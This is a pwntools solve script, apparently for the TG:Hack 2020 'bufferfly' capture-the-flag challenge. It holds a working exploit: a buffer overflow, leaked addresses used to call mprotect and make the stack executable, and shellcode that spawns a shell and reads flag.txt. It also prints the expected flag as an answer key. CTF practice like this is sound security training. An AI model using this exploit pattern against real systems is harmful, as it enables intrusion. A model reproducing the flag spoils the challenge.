#!/usr/bin/env python2
from pwn import *


# set debug = True to test solution locally
debug = False
# Run with strace for debugging
# This creates a need for a slightly different method of parsing
strace = False

if args.REGION:
    host = args.REGION + ".bufferfly.tghack.no"
else:
    host = "bufferfly.tghack.no"

if debug:
    if strace:
        c = process("strace './bufferfly'", shell=True)
    else:
        c = process("./bufferfly")
else:
    c = remote(host, 6002)

# werks
c.sendline("a"*17 + "\x00" + "\x19\x00\x00\x00")
curr = c.recvuntil("you know, the one at 0x")
curr = c.recvline()
goal_address = p32(int(curr.split("!")[0], 16))
c.sendline("a" * 32 + goal_address + "\n\n %x %x")

###############################
#     Creating shellcode      #
###############################
context.update(arch='i386', os='linux')
shellcode = asm(shellcraft.sh())

###############################
#  Getting address of buffer  #
###############################
c.sendline("mattac\nnot donio")
c.recvuntil("Also I'm hiding here: ")
curr = c.recv()
if strace:
    addr = curr.split("\"")[0]
else:
    print(curr)
    addr = curr.split(".")[0]

stack_ret = int(addr, 16)
# stack address to give permissions to. Find by aligning down(?) return address
stack_start = (stack_ret / 4096) * 4096
stack_ret = p32(stack_ret)
stack_start = p32(stack_start)

###############################
# Getting address of mprotect #
###############################
c.sendline("mprotec\nnot done")
curr = c.recvuntil("She protecs right here in fact: ")
curr = c.recvline()
mprotect = p32(int(curr.split(".")[0], 16))
permissions = p32(0x00000007)  # Need read, write and execute
size = p32(0x0001000)  # pagesize/4096

###############################
#   Assembling final payload  #
###############################
pad = "A" * 28
payload = shellcode + pad
payload += mprotect + stack_ret + stack_start + size + permissions
c.sendline(payload + "\ndone")

c.recvuntil("done?")
c.recvuntil("done?")
c.recvline()

c.sendline("cat flag.txt")
flag = c.recvline()[:-1]
print(flag)
if flag == "TG20{she_mprotec_but_she_also_matac}":
    print("yay: {}".format(flag))
    sys.exit(101)
else:
    sys.exit(102)
c.interactive()
